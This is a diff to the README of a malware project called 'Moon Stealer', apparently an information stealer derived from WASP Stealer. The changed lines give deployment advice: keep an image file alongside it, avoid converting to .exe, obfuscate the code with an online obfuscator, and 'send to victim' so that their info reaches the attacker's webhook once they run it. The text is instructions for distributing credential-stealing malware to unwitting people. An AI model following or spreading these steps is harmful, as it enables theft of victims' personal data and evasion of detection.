@@ -7,6 +7,7 @@ Moon Stealer
 ## Based on WASP Stealer.
  
 ### Do not remove Moon.jpg or it will give you an error, even if your going to send it to someone keep the Moon.jpg file.
+#### Converting to a .exe breaks the code.
  
 <p align="center"> 
   <kbd>
@@ -28,7 +29,7 @@ Moon Stealer
 
 5. Obfuscate your code: https://pyobfuscate.com/ (Built in Obfuscator soon!
 6. 
-7. Send to victim and when they open you will have their info in the webhook provided.
+7. Send to victim and when they run you will have their info in the webhook provided.
 
 <a id="features"></a>
 
